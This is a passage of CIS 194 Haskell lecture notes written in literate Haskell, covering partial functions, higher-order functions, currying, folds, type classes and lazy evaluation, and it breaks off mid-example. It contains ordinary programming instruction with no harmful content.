> doStuff1 xs  = head xs + (head (tail xs)) 

> doStuff2 :: [Int] -> Int
> doStuff2 []        = 0
> doStuff2 [_]       = 0
> doStuff2 (x1:x2:_) = x1 + x2

These functions compute exactly the same result, and they are both
total.  But only the second one is *obviously* total, and it is much
easier to read anyway.

**Writing partial functions**

What if you find yourself *writing* a partial functions? There are two
approaches to take.  The first is to change the output type of the
function to indicate the possible failure. Recall the definition of `Maybe`:

~~~~ {.haskell}
data Maybe a = Nothing | Just a
~~~~

Now, suppose we were writing `head`.  We could rewrite it safely like
this:

> safeHead :: [a] -> Maybe a
> safeHead []    = Nothing
> safeHead (x:_) = Just x

Indeed, there is exactly such a function defined in the [`safe`
package](http://hackage.haskell.org/package/safe).

Why is this a good idea?

1. `safeHead` will never crash.  
2. The type of `safeHead` makes it obvious that it may fail for some
   inputs.
3. The type system ensures that users of `safeHead` must appropriately
   check the return value of `safeHead` to see whether they got a value
   or `Nothing`.

In some sense, `safeHead` is still "partial"; but we have reflected
the partiality in the type system, so it is now safe.  The goal is to
have the types tell us as much as possible about the behavior of
functions.

OK, but what if we know that we will only use `head` in situations
where we are *guaranteed* to have a non-empty list?  In such a
situation, it is really annoying to get back a `Maybe a`, since we
have to expend effort dealing with a case which we "know" cannot
actually happen.  

The answer is that if some condition is really *guaranteed*, then the
types ought to reflect the guarantee!  Then the compiler can enforce
your guarantees for you.  For example:

> data NonEmptyList a = NEL a [a]
>
> nelToList :: NonEmptyList a -> [a]
> nelToList (NEL x xs) = x:xs
>
> listToNel :: [a] -> Maybe (NonEmptyList a)
> listToNel []     = Nothing
> listToNel (x:xs) = Just $ NEL x xs
>
> headNEL :: NonEmptyList a -> a
> headNEL (NEL a _) = a
>
> tailNEL :: NonEmptyList a -> [a]
> tailNEL (NEL _ as) = as

You might think doing such things is only for chumps who are not
coding super-geniuses like you.  Of course, *you* would never make a
mistake like passing an empty list to a function which expects only
non-empty ones.  Right?  Well, there's definitely a chump involved,
but it's not who you think.


/CS194 Lectures 04 Higher-order programming and type inference
==============================================================

<!--
{-# OPTIONS_GHC -Wall #-}
-->


CIS 194 Week 4  
4 February 2013

Suggested reading: 

  * *Learn You a Haskell for Great Good* chapter "Higher-Order Functions" (Chapter 5 in the printed book; [Chapter 6 online](http://learnyouahaskell.com/higher-order-functions))

Anonymous functions
-------------------

Suppose we want to write a function 

~~~~ {.haskell}
greaterThan100 :: [Integer] -> [Integer]
~~~~

which keeps only those `Integers` from the input list which are
greater than 100.  For example, 

~~~~ {.haskell}
greaterThan100 [1,9,349,6,907,98,105] = [349,907,105].
~~~~

By now, we know a nice way to do this: 

> gt100 :: Integer -> Bool
> gt100 x = x > 100
>
> greaterThan100 :: [Integer] -> [Integer]
> greaterThan100 xs = filter gt100 xs

But it's annoying to give `gt100` a name, since we are probably never
going to use it again.  Instead, we can use an *anonymous function*,
also known as a *lambda abstraction*:

> greaterThan100_2 :: [Integer] -> [Integer]
> greaterThan100_2 xs = filter (\x -> x > 100) xs

`\x -> x > 100` (the backslash is supposed to look kind of like a
lambda with the short leg missing) is the function which takes a
single argument `x` and outputs whether `x` is greater than 100.

Lambda abstractions can also have multiple arguments. For example:

    Prelude> (\x y z -> [x,2*y,3*z]) 5 6 3
    [5,12,9]

However, in the particular case of `greaterThan100`, there's an even
better way to write it, without a lambda abstraction:

> greaterThan100_3 :: [Integer] -> [Integer]
> greaterThan100_3 xs = filter (>100) xs

`(>100)` is an *operator section*: if `?` is an operator, then `(?y)`
is equivalent to the function `\x -> x ? y`, and `(y?)` is equivalent
to `\x -> y ? x`.  In other words, using an operator section allows us
to *partially apply* an operator to one of its two arguments.  What we
get is a function of a single argument.  Here are some examples:

    Prelude> (>100) 102
    True
    Prelude> (100>) 102
    False
    Prelude> map (*6) [1..5]
    [6,12,18,24,30]

Function composition
--------------------

Before reading on, can you write down a function whose type is

~~~~ {.haskell}
(b -> c) -> (a -> b) -> (a -> c)
~~~~

?

Let's try.  It has to take two arguments, both of which are functions,
and output a function.

~~~~ {.haskell}
foo f g = ...
~~~~

In the place of the `...` we need to write a function of type `a ->
c`.  Well, we can create a function using a lambda abstraction:

~~~~ {.haskell}
foo f g = \x -> ...
~~~~

`x` will have type `a`, and now in the `...` we need to write an
expression of type `c`.  Well, we have a function `g` which can turn
an `a` into a `b`, and a function `f` which can turn a `b` into a `c`,
so this ought to work:

> foo :: (b -> c) -> (a -> b) -> (a -> c)
> foo f g = \x -> f (g x)

(Quick quiz: why do we need the parentheses around `g x`?)

OK, so what was the point of that?  Does `foo` actually do anything
useful or was that just a silly exercise in working with types?

As it turns out, `foo` is really called `(.)`, and represents
*function composition*.  That is, if `f` and `g` are functions, then
`f . g` is the function which does first `g` and then `f`.

Function composition can be quite useful in writing concise, elegant
code.  It fits well in a "wholemeal" style where we think about
composing together successive high-level transformations of a data
structure.

As an example, consider the following function: 

> myTest :: [Integer] -> Bool
> myTest xs = even (length (greaterThan100 xs))

We can rewrite this as: 

> myTest' :: [Integer] -> Bool
> myTest' = even . length . greaterThan100

This version makes much clearer what is really going on: `myTest'` is
just a "pipeline" composed of three smaller functions.  This example
also demonstrates why function composition seems "backwards": it's
because function application is backwards!  Since we read from left to
right, it would make sense to think of values as also flowing from
left to right.  But in that case we should write \\( (x)f \\) to
denote giving the value \\(x\\) as an input to the function \\(f\\).
But no thanks to Alexis Claude Clairaut and Euler, we have been stuck
with the backwards notation since 1734.

Let's take a closer look at the type of `(.)`.  If we ask `ghci` for
its type, we get

    Prelude> :t (.)
    (.) :: (b -> c) -> (a -> b) -> a -> c

Wait a minute.  What's going on here?  What happened to the
parentheses around `(a -> c)`?

Currying and partial application
--------------------------------

Remember how the types of multi-argument functions look weird, like
they have "extra" arrows in them?  For example, consider the function

> f :: Int -> Int -> Int
> f x y = 2*x + y

I promised before that there is a beautiful, deep reason for this, and
now it's finally time to reveal it: *all functions in Haskell take
only one argument*.  Say what?! But doesn't the function `f` shown
above take two arguments?  No, actually, it doesn't: it takes one
argument (an `Int`) and *outputs a function* (of type `Int -> Int`);
that function takes one argument and returns the final answer.  In
fact, we can equivalently write `f`'s type like this:

> f' :: Int -> (Int -> Int)
> f' x y = 2*x + y

In particular, note that function arrows *associate to the right*,
that is, `W -> X -> Y -> Z` is equivalent to `W -> (X -> (Y -> Z))`.
We can always add or remove parentheses around the rightmost top-level
arrow in a type.

Function application, in turn, is *left*-associative. That is, `f 3 2`
is really shorthand for `(f 3) 2`.  This makes sense given what we
said previously about `f` actually taking one argument and returning a
function: we apply `f` to an argument `3`, which returns a function of
type `Int -> Int`, namely, a function which takes an `Int` and adds 6
to it. We then apply that function to the argument `2` by writing `(f
3) 2`, which gives us an `Int`.  Since function application associates
to the left, however, we can abbreviate `(f 3) 2` as `f 3 2`, giving
us a nice notation for `f` as a "multi-argument" function.

The "multi-argument" lambda abstraction 

~~~~ {.haskell}
\x y z -> ... 
~~~~

is really just syntax sugar for 

~~~~ {.haskell}
\x -> (\y -> (\z -> ...)).  
~~~~

Likewise, the function definition 

~~~~ {.haskell}
f x y z = ... 
~~~~

is syntax sugar for 

~~~~ {.haskell}
f = \x -> (\y -> (\z -> ...)).
~~~~

Note, for example, that we can rewrite our composition function from
above by moving the `\x -> ...` from the right-hand side of the `=` to
the left-hand side:

> comp :: (b -> c) -> (a -> b) -> a -> c
> comp f g x = f (g x)

This idea of representing multi-argument functions as one-argument
functions returning functions is known as *currying*, named for the
British mathematician and logician Haskell Curry.  (His first name
might sound familiar; yes, it's the same guy.) Curry lived from
1900-1982 and spent much of his life at Penn State---but he also
helped work on ENIAC at UPenn.  The idea of representing
multi-argument functions as one-argument functions returning functions
was actually first discovered by Moses Sch√∂nfinkel, so we probably
ought to call it *sch√∂nfinkeling*.  Curry himself attributed the idea
to Sch√∂nfinkel, but others had already started calling it "currying"
and it was too late.

If we want to actually represent a function of two arguments we
can use a single argument which is a tuple.  That is, the function

> f'' :: (Int,Int) -> Int
> f'' (x,y) = 2*x + y

can also be thought of as taking "two arguments", although in another
sense it really only takes one argument which happens to be a pair.
In order to convert between the two representations of a two-argument
function, the standard library defines functions called `curry` and
`uncurry`, defined like this (except with different names):

> sch√∂nfinkel :: ((a,b) -> c) -> a -> b -> c
> sch√∂nfinkel f x y = f (x,y)
>
> unsch√∂nfinkel :: (a -> b -> c) -> (a,b) -> c
> unsch√∂nfinkel f (x,y) = f x y

`uncurry` in particular can be useful when you have a pair and want to
apply a function to it.  For example:

    Prelude> uncurry (+) (2,3)
    5

**Partial application**

The fact that functions in Haskell are curried makes *partial
application* particularly easy.  The idea of partial application is
that we can take a function of multiple arguments and apply it to just
*some* of its arguments, and get out a function of the remaining
arguments.  But as we've just seen, in Haskell there *are no*
functions of multiple arguments!  Every function can be "partially
applied" to its first (and only) argument, resulting in a function of
the remaining arguments.

Note that Haskell doesn't make it easy to partially apply to an
argument other than the first. The one exception is infix operators,
which as we've seen, can be partially applied to either of their two
arguments using an operator section.  In practice this is not that big
of a restriction.  There is an art to deciding the order of arguments
to a function to make partial applications of it as useful as
possible: the arguments should be ordered from from "least to greatest
variation", that is, arguments which will often be the same should be
listed first, and arguments which will often be different should come
last.

**Wholemeal programming**

Let's put some of the things we've just learned together in an example
that also shows the power of a "wholemeal" style of programming.
Consider the function `foobar`, defined as follows:

> foobar :: [Integer] -> Integer
> foobar []     = 0
> foobar (x:xs)
>   | x > 3     = (7*x + 2) + foobar xs
>   | otherwise = foobar xs

This seems straightforward enough, but it is not good Haskell
style. The problem is that it is

  * doing too much at once; and
  * working at too low of a level.

Instead of thinking about what we want to do with each element, we can
instead think about making incremental transformations to the entire
input, using the existing recursion patterns that we know of.  Here's
a much more idiomatic implementation of `foobar`:

> foobar' :: [Integer] -> Integer
> foobar' = sum . map (\x -> 7*x + 2) . filter (>3)

This defines `foobar'` as a "pipeline" of three functions: first, we
throw away all elements from the list which are not greater than
three; next, we apply an arithmetic operation to every element of the
remaining list; finally, we sum the results.

Notice that in the above example, `map` and `filter` have been
partially applied.  For example, the type of `filter` is

~~~~ {.haskell}
(a -> Bool) -> [a] -> [a]
~~~~

Applying it to `(>3)` (which has type `Integer -> Bool`) results in a
function of type `[Integer] -> [Integer]`, which is exactly the right
sort of thing to compose with another function on `[Integer]`.

This style of coding in which we define a function without reference
to its arguments---in some sense saying what a function *is* rather
than what it *does*---is known as "point-free" style.  As we can see
from the above example, it can be quite beautiful.  Some people might
even go so far as to say that you should always strive to use
point-free style; but taken too far it can become extremely confusing.
`lambdabot` in the `#haskell` IRC channel has a command `@pl` for
turning functions into equivalent point-free expressions; here's an
example:

    @pl \f g x y -> f (x ++ g x) (g y)
    join . ((flip . ((.) .)) .) . (. ap (++)) . (.)

This is clearly *not* an improvement! 

Folds
-----

We have one more recursion pattern on lists to talk about: folds.
Here are a few functions on lists that follow a similar pattern: all
of them somehow "combine" the elements of the list into a final
answer.

> sum' :: [Integer] -> Integer
> sum' []     = 0
> sum' (x:xs) = x + sum' xs
>
> product' :: [Integer] -> Integer
> product' [] = 1
> product' (x:xs) = x * product' xs
>
> length' :: [a] -> Int
> length' []     = 0
> length' (_:xs) = 1 + length' xs

What do these three functions have in common, and what is different?
As usual, the idea will be to abstract out the parts that vary, aided
by the ability to define higher-order functions.

> fold :: b -> (a -> b -> b) -> [a] -> b
> fold z f []     = z
> fold z f (x:xs) = f x (fold z f xs)

Notice how `fold` essentially replaces `[]` with `z` and `(:)` with
`f`, that is,

    fold f z [a,b,c] == a `f` (b `f` (c `f` z))

(If you think about `fold` from this perspective, you may be able to
figure out how to generalize `fold` to data types other than lists...)

Now let's rewrite `sum'`, `product'`, and `length'` in terms of `fold`:

> sum''     = fold 0 (+)
> product'' = fold 1 (*)
> length''  = fold 0 (\_ s -> 1 + s)

(Instead of `(\_ s -> 1 + s)` we could also write `(\_ -> (1+))` or
even `(const (1+))`.)

Of course, `fold` is already provided in the standard Prelude, under
the name [`foldr`](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#v:foldr). The arguments to `foldr` are in a slightly
different order but it's the exact same function.  Here are some
Prelude functions which are defined in terms of `foldr`:

  * `length`  `::          [a] -> Int`
  * `sum`     `:: Num a => [a] -> a`
  * `product` `:: Num a => [a] -> a`
  * `and`     `::          [Bool] -> Bool`
  * `or`      `::          [Bool] -> Bool`
  * `any`     `:: (a -> Bool) -> [a] -> Bool`
  * `all`     `:: (a -> Bool) -> [a] -> Bool`

There is also [`foldl`](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#v:foldl), which folds "from the left".  That is,

    foldr f z [a,b,c] == a `f` (b `f` (c `f` z))
    foldl f z [a,b,c] == ((z `f` a) `f` b) `f` c

In general, however, you should use [`foldl'` from 
`Data.List`](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html#v:foldl)
instead, which does the same thing as `foldl` but is more efficient.


/CS194 Lectures 05 More polymorphism and type classes
=====================================================

 <!-- CLASS

> {-# LANGUAGE FlexibleInstances, MultiParamTypeClasses #-}
> {-# OPTIONS_GHC -Wall -fno-warn-missing-signatures #-}

-->

CIS 194 Week 5  
11 February 2013

Haskell's particular brand of polymorphism is known as *parametric*
polymorphism.  Essentially, this means that polymorphic functions must
work *uniformly* for any input type.  This turns out to have some
interesting implications for both programmers and users of polymorphic
functions.

Parametricity
-------------

Consider the type

~~~~ {.haskell}
a -> a -> a
~~~~

Remember that `a` is a *type variable* which can stand for any type.
What sorts of functions have this type?

What about this:

~~~~ {.haskell}
f :: a -> a -> a
f x y = x && y
~~~~

It turns out that this doesn't work.  The syntax is valid, at least,
but it does not type check.  In particular we get this error message:

    2012-02-09.lhs:37:16:
        Couldn't match type `a' with `Bool'
          `a' is a rigid type variable bound by
              the type signature for f :: a -> a -> a at 2012-02-09.lhs:37:3
        In the second argument of `(&&)', namely `y'
        In the expression: x && y
        In an equation for `f': f x y = x && y

The reason this doesn't work is that the *caller* of a polymorphic
function gets to choose the type.  Here we, the *implementors*, have
tried to choose a specific type (namely, `Bool`), but we may be given
`String`, or `Int`, or even some type defined by someone using `f`,
which we can't possibly know about in advance.  In other words, you
can read the type

~~~~ {.haskell}
a -> a -> a
~~~~

as a *promise* that a function with this type will work no matter what
type the caller chooses.

Another implementation we could imagine is something like

    f a1 a2 = case (typeOf a1) of
                Int  -> a1 + a2
                Bool -> a1 && a2
                _    -> a1

where `f` behaves in some specific ways for certain types.  After all,
we can certainly implement this in Java:

    class AdHoc {

        public static Object f(Object a1, Object a2) {
            if (a1 instanceof Integer && a2 instanceof Integer) {
                return (Integer)a1 + (Integer)a2;
            } else if (a1 instanceof Boolean && a2 instanceof Boolean) {
                return (Boolean)a1 && (Boolean)a2;
            } else {
                return a1;
            }
        }

        public static void main (String[] args) {
            System.out.println(f(1,3));
            System.out.println(f(true, false));
            System.out.println(f("hello", "there"));
        }

    }

    [byorgey@LVN513-9:~/tmp]$ javac Adhoc.java && java AdHoc
    4
    false
    hello

But it turns out there is no way to write this in Haskell.  Haskell
does not have anything like Java's `instanceof` operator: it is not
possible to ask what type something is and decide what to do based on
the answer.  One reason for this is that Haskell types are *erased* by
the compiler after being checked: at runtime, there is no type
information around to query!  However, as we will see, there are other
good reasons too.

This style of polymorphism is known as *parametric polymorphism*.  We
say that a function like `f :: a -> a -> a` is *parametric* in the
type `a`.  Here "parametric" is just a fancy term for "works uniformly
for any type chosen by the caller".  In Java, this style of
polymorphism is provided by *generics* (which, you guessed it, were
inspired by Haskell: one of the original designers of Haskell,
[Philip Wadler](http://homepages.inf.ed.ac.uk/wadler/), was later one
of the key players in the development of Java generics).

So, what functions actually *could* have this type?  Actually, there
are only two!

~~~~ {.haskell}
f1 :: a -> a -> a
f1 x y = x

f2 :: a -> a -> a
f2 x y = y
~~~~

So it turns out that the type `a -> a -> a` really tells us quite a
lot.

Let's play the parametricity game!  Consider each of the following
polymorphic types.  For each type, determine what behavior(s) a
function of that type could possibly have.

  * `a -> a`
  * `a -> b`
  * `a -> b -> a`
  * `[a] -> [a]`
  * `(b -> c) -> (a -> b) -> (a -> c)`
  * `(a -> a) -> a -> a`

Two views on parametricity
--------------------------

As an *implementor* of polymorphic functions, especially if you are
used to a language with a construct like Java's `instanceof`, you
might find these restrictions annoying.  "What do you mean, I'm not
allowed to do X?"

However, there is a dual point of view.  As a *user* of polymorphic
functions, parametricity corresponds not to *restrictions* but to
*guarantees*.  In general, it is much easier to use and reason about
tools when those tools give you strong guarantees as to how they will
behave.  Parametricity is part of the reason that just looking at the
type of Haskell function can tell you so much about the function.

OK, fine, but sometimes it really is useful to be able to decide what
to do based on types!  For example, what about addition?  We've
already seen that addition is polymorphic (it works on `Int`,
`Integer`, and `Double`, for example) but clearly it has to know what
type of numbers it is adding to decide what to do: adding two
`Integer`s works in a completely different way than adding two
`Double`s.  So how does it actually work? Is it just magical?

In fact, it isn't!  And we *can* actually use Haskell to decide what
to do based on types---just not in the way we were imagining before.
Let's start by taking a look at the type of `(+)`:

    Prelude> :t (+)
    (+) :: Num a => a -> a -> a

Hmm, what's that `Num a =>` thingy doing there?  In fact, `(+)` isn't
the only standard function with a funny double-arrow thing in its
type.  Here are a few others:

~~~~ {.haskell}
(==) :: Eq a   => a -> a -> Bool
(<)  :: Ord a  => a -> a -> Bool
show :: Show a => a -> String
~~~~

So what's going on here? 

Type classes
------------

`Num`, `Eq`, `Ord`, and `Show` are *type classes*, and we say that
`(==)`, `(<)`, and `(+)` are "type-class polymorphic".  Intuitively,
type classes correspond to *sets of types* which have certain
operations defined for them, and type class polymorphic functions work
only for types which are instances of the type class(es) in question.
As an example, let's look in detail at the `Eq` type class.

~~~~ {.haskell}
class Eq a where
  (==) :: a -> a -> Bool
  (/=) :: a -> a -> Bool
~~~~

We can read this as follows: `Eq` is declared to be a type class with
a single parameter, `a`.  Any type `a` which wants to be an *instance*
of `Eq` must define two functions, `(==)` and `(/=)`, with the
indicated type signatures.  For example, to make `Int` an instance of
`Eq` we would have to define `(==) :: Int -> Int -> Bool` and `(/=) ::
Int -> Int -> Bool`.  (Of course, there's no need, since the standard
Prelude already defines an `Int` instance of `Eq` for us.)

Let's look at the type of `(==)` again: 

~~~~ {.haskell}
(==) :: Eq a => a -> a -> Bool
~~~~

The `Eq a` that comes before the `=>` is a *type class constraint*.
We can read this as saying that for any type `a`, *as long as `a` is
an instance of `Eq`*, `(==)` can take two values of type `a` and
return a `Bool`.  It is a type error to call the function `(==)` on
some type which is not an instance of `Eq`.  If a normal polymorphic
type is a promise that the function will work for whatever type the
caller chooses, a type class polymorphic function is a *restricted*
promise that the function will work for any type the caller chooses,
*as long as* the chosen type is an instance of the required type
class(es).

The important thing to note is that when `(==)` (or any type class
method) is used, the compiler uses type inference to figure out *which
implementation of `(==)` should be chosen*, based on the inferred
types of its arguments.  In other words, it is something like using an
overloaded method in a language like Java.

To get a better handle on how this works in practice, let's make our
own type and declare an instance of `Eq` for it.

> data Foo = F Int | G Char
>
> instance Eq Foo where
>   (F i1) == (F i2) = i1 == i2
>   (G c1) == (G c2) = c1 == c2
>   _ == _ = False
>
>   foo1 /= foo2 = not (foo1 == foo2)

It's a bit annoying that we have to define both `(==)` and `(/=)`.  In
fact, type classes can give *default implementations* of methods in
terms of other methods, which should be used whenever an instance does
not override the default definition with its own.  So we could imagine
declaring `Eq` like this:

~~~~ {.haskell}
class Eq a where
  (==) :: a -> a -> Bool
  (/=) :: a -> a -> Bool
  x /= y = not (x == y)
~~~~

Now anyone declaring an instance of `Eq` only has to specify an
implementation of `(==)`, and they will get `(/=)` for free.  But if
for some reason they want to override the default implementation of
`(/=)` with their own, they can do that as well.

In fact, the `Eq` class is actually declared like this: 

~~~~ {.haskell}
class Eq a where
  (==), (/=) :: a -> a -> Bool
  x == y = not (x /= y)
  x /= y = not (x == y)
~~~~

This means that when we make an instance of `Eq`, we can define
*either* `(==)` or `(/=)`, whichever is more convenient; the other one
will be automatically defined in terms of the one we specify.
(However, we have to be careful: if we don't specify either one, we
get infinite recursion!)

As it turns out, `Eq` (along with a few other standard type classes)
is special: GHC is able to automatically generate instances of `Eq`
for us.  Like so:

> data Foo' = F' Int | G' Char
>   deriving (Eq, Ord, Show)

This tells GHC to automatically derive instances of the `Eq`, `Ord`,
and `Show` type classes for our data type `Foo`.

**Type classes and Java interfaces**

Type classes are quite similar to Java interfaces.  Both define a set
of types/classes which implement a specified list of operations.
However, there are a couple of important ways in which type classes
are more general than Java interfaces:

  1. When a Java class is defined, any interfaces it implements must be
    declared.  Type class instances, on the other hand, are declared
    separately from the declaration of the corresponding types, and can
    even be put in a separate module.

  2. The types that can be specified for type class methods are more
    general and flexible than the signatures that can be given for Java
    interface methods, especially when *multi-parameter type classes*
    enter the picture.  For example, consider a hypothetical type class

    > class Blerg a b where
    >   blerg :: a -> b -> Bool

    Using `blerg` amounts to doing *multiple dispatch*: which
    implementation of `blerg` the compiler should choose depends on
    *both* the types `a` and `b`.  There is no easy way to do this in
    Java.

    Haskell type classes can also easily handle binary (or ternary, or
    ...) methods, as in

    > class Num a where
    >   (+) :: a -> a -> a
    >   ...

    There is no nice way to do this in Java: for one thing, one of the
    two arguments would have to be the "privileged" one which is actually
    getting the `(+)` method invoked on it, and this asymmetry is awkward.
    Furthermore, because of Java's subtyping, getting two arguments of a
    certain interface type does *not* guarantee that they are actually the
    same type, which makes implementing binary operators such as `(+)`
    awkward (usually requiring some runtime type checks).

**Standard type classes**

Here are some other standard type classes you should know about:

  * [Ord](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3AOrd)
    is for types whose elements can be *totally ordered*, that is, where
    any two elements can be compared to see which is less than the other.
    It provides comparison operations like `(<)` and `(<=)`, and also the
    `compare` function.

  * [Num](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3ANum)
    is for "numeric" types, which support things like addition,
    subtraction, and multipication.  One very important thing to note is
    that integer literals are actually type class polymorphic:

        Prelude> :t 5
        5 :: Num a => a

    This means that literals like `5` can be used as `Int`s,
    `Integer`s, `Double`s, or any other type which is an instance of
    `Num` (`Rational`, `Complex Double`, or even a type you define...)

  * [Show](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3AShow)
    defines the method `show`, which is used to convert values into
    `String`s.

  * [Read](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#v:Eq/Read) is the dual of `Show`.

  * [Integral](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3AIntegral) represents whole number types such as `Int` and `Integer`.

**A type class example**

As an example of making our own type class, consider the following:

> class Listable a where
>   toList :: a -> [Int]

We can think of `Listable` as the class of things which can be
converted to a list of `Int`s.  Look at the type of `toList`:

~~~~ {.haskell}
toList :: Listable a => a -> [Int]
~~~~

Let's make some instances for `Listable`.  First, an `Int` can be
converted to an `[Int]` just by creating a singleton list, and `Bool`
can be converted similarly, say, by translating `True` to `1` and
`False` to `0`:

> instance Listable Int where
>   -- toList :: Int -> [Int]
>   toList x = [x]
>
> instance Listable Bool where
>   toList True  = [1]
>   toList False = [0]

We don't need to do any work to convert a list of `Int` to a list of
`Int`:

> instance Listable [Int] where
>   toList = id

Finally, here's a binary tree type which we can convert to a list by
flattening:

> data Tree a = Empty | Node a (Tree a) (Tree a)
>
> instance Listable (Tree Int) where
>   toList Empty        = []
>   toList (Node x l r) = toList l ++ [x] ++ toList r

If we implement other functions in terms of `toList`, they also get a
`Listable` constraint.  For example:

> -- to compute sumL, first convert to a list of Ints, then sum
> sumL x = sum (toList x)

`ghci` informs us that type type of `sumL` is

~~~~ {.haskell}
sumL :: Listable a => a -> Int
~~~~

which makes sense: `sumL` will work only for types which are instances
of `Listable`, since it uses `toList`.  What about this one?

> foo x y = sum (toList x) == sum (toList y) || x < y

`ghci` informs us that the type of `foo` is

~~~~ {.haskell}
foo :: (Listable a, Ord a) => a -> a -> Bool
~~~~

That is, `foo` works over types which are instances of *both*
`Listable` and `Ord`, since it uses both `toList` and comparison on
the arguments.

As a final, and more complex, example, consider this instance:

> instance (Listable a, Listable b) => Listable (a,b) where
>   toList (x,y) = toList x ++ toList y

Notice how we can put type class constraints on an instance as well as
on a function type.  This says that a pair type `(a,b)` is an instance
of `Listable` as long as `a` and `b` both are.  Then we get to use
`toList` on values of types `a` and `b` in our definition of `toList`
for a pair.  Note that this definition is *not* recursive!  The
version of `toList` that we are defining is calling *other* versions
of `toList`, not itself.



 <!--

Type classes under the hood
---------------------------

XXX Not necessary, but can give some good intuition.

Play it by ear and see if I end up covering this in class.  Depends
how much time we have.  "simulate" our own type classes with
dictionary = record of functions.  Do example with Ord.  Type classes
just make this extra dictionary argument implicit.

-->

 <!--

Newtype  (???)
-------

XXX A good way to motivate it would be different Monoids for numeric
types, but we won't talk about Monoid today...  Cover it now or wait
until Monoid?

-->

 <!--

Local Variables:
mode:markdown
compile-command:"make explec"
End:

-->


/CS194 Lectures 06 Lazy evaluation
==================================

 <!-- CLASS

> {-# OPTIONS_GHC -Wall #-}

-->

CIS 194 Week 6  
18 February 2012

Suggested reading: 

  * [foldr foldl foldl'](http://haskell.org/haskellwiki/Foldr_Foldl_Foldl%27) from the Haskell wiki


On the first day of class I mentioned that Haskell is *lazy*, and
promised to eventually explain in more detail what this means.  The
time has come!

Strict evaluation
-----------------

Before we talk about *lazy evaluation* it will be useful to look at
some examples of its opposite, *strict evaluation*.

Under a strict evaluation strategy, function arguments are completely
evaluated *before* passing them to the function. For example, suppose
we have defined

~~~~ {.haskell}
f x y = x + 2
~~~~

In a strict language, evaluating `f 5 (29^35792)` will first
completely evaluate `5` (already done) and `29^35792` (which is a lot
of work) before passing the results to `f`.

Of course, in this *particular* example, this is silly, since `f`
ignores its second argument, so all the work to compute `29^35792` was
wasted.  So why would we want this?

The benefit of strict evaluation is that it is easy to predict *when*
and *in what order* things will happen.  Usually languages with
strict evaluation will even specify the order in which function
arguments should be evaluated (*e.g.* from left to right).

For example, in Java if we write

    f (release_monkeys(), increment_counter())
    
we know that the monkeys will be released, and then the counter will
be incremented, and then the results of doing those things will be
passed to `f`, and it does not matter whether `f` actually ends up
using those results.  

If the releasing of monkeys and incrementing of the counter could
independently happen, or not, in either order, depending on whether
`f` happens to use their results, it would be extremely
confusing. When such "side effects" are allowed, strict evaluation is
really what you want.

Side effects and purity
-----------------------

So, what's really at issue here is the presence or absence of *side
effects*.  By "side effect" we mean *anything that causes evaluation
of an expression to interact with something outside itself*.  The root
issue is that such outside interactions are time-sensitive.  For
example:

* Modifying a global variable --- it matters when this happens since
  it may affect the evaluation of other expressions
* Printing to the screen --- it matters when this happens since it may
  need to be in a certain order with respect to other writes to the
  screen
* Reading from a file or the network --- it matters when this happens
  since the contents of the file can affect the outcome of the
  expression

As we have seen, lazy evaluation makes it hard to reason about when
things will be evaluated; hence including side effects in a lazy
language would be extremely unintuitive. Historically, this is the
reason Haskell is pure: initially, the designers of Haskell wanted to
make a *lazy* functional language, and quickly realized it would be
impossible unless it also disallowed side effects.

But... a language with *no* side effects would not be very useful.
The only thing you could do with such a language would be to load up
your programs in an interpreter and evaluate expressions. (Hmm... that
sounds familiar...) You would not be able to get any input from the
user, or print anything to the screen, or read from a file.  The
challenge facing the Haskell designers was to come up with a way to
allow such effects in a principled, restricted way that did not
interfere with the essential purity of the language.  They finally did
come up with something (namely, the `IO` monad) which we'll talk about
in a few weeks.

Lazy evaluation
---------------

<img src="/static/relax.jpg" width="200px" />

So now that we understand strict evaluation, let's see what lazy
evaluation actually looks like. Under a lazy evaluation strategy,
evaluation of function arguments is *delayed as long as possible*:
they are not evaluated until it actually becomes necessary to do so.
When some expression is given as an argument to a function, it is
simply packaged up as an *unevaluated expression* (called a "thunk",
don't ask me why) without doing any actual work.

For example, when evaluating `f 5 (29^35792)`, the second argument
will simply be packaged up into a thunk without doing any actual
computation, and `f` will be called immediately.  Since `f` never uses
its second argument the thunk will just be thrown away by the garbage
collector.

Pattern matching drives evaluation
----------------------------------

So, when is it "necessary" to evaluate an expression? The examples
above concentrated on whether a function *used* its arguments, but
this is actually not the most important distinction. Consider the
following examples:

> f1 :: Maybe a -> [Maybe a]
> f1 m = [m,m]
>
> f2 :: Maybe a -> [a]
> f2 Nothing  = []
> f2 (Just x) = [x]

`f1` and `f2` both *use* their argument.  But there is still a big
difference between them.  Although `f1` uses its argument `m`, it does
not need to know anything about it.  `m` can remain completely
unevaluated, and the unevaluated expression is simply put in a list.
Put another way, the result of `f1 e` does not depend on the shape of
`e`.

`f2`, on the other hand, needs to know something about its argument in
order to proceed: was it constructed with `Nothing` or `Just`?  That
is, in order to evaluate `f2 e`, we must first evaluate `e`, because
the result of `f2` depends on the shape of `e`.

The other important thing to note is that thunks are evaluated *only
enough* to allow a pattern match to proceed, and no further!  For
example, suppose we wanted to evaluate `f2 (safeHead [3^500, 49])`.
`f2` would force evaluation of the call to `safeHead [3^500, 49]`,
which would evaluate to `Just (3^500)`---note that the `3^500` is
*not* evaluated, since `safeHead` does not need to look at it, and
neither does `f2`.  Whether the `3^500` gets evaluated later depends
on how the result of `f2` is used.

The slogan to remember is "*pattern matching drives evaluation*".  To
reiterate the important points:

* Expressions are only evaluated when pattern-matched

* ...only as far as necessary for the match to proceed, and no farther!

Let's do a slightly more interesting example: we'll evaluate `take 3
(repeat 7)`.  For reference, here are the definitions of `repeat` and
`take`:

~~~~ {.haskell}
repeat :: a -> [a]
repeat x = x : repeat x

take :: Int -> [a] -> [a] 
take n _      | n <= 0 =  []
take _ []              =  []
take n (x:xs)          =  x : take (n-1) xs
~~~~

Carrying out the evaluation step-by-step looks something like this:

      take 3 (repeat 7)
          { 3 <= 0 is False, so we proceed to the second clause, which
       needs to match on the second argument. So we must expand
       repeat 7 one step. }
    = take 3 (7 : repeat 7)
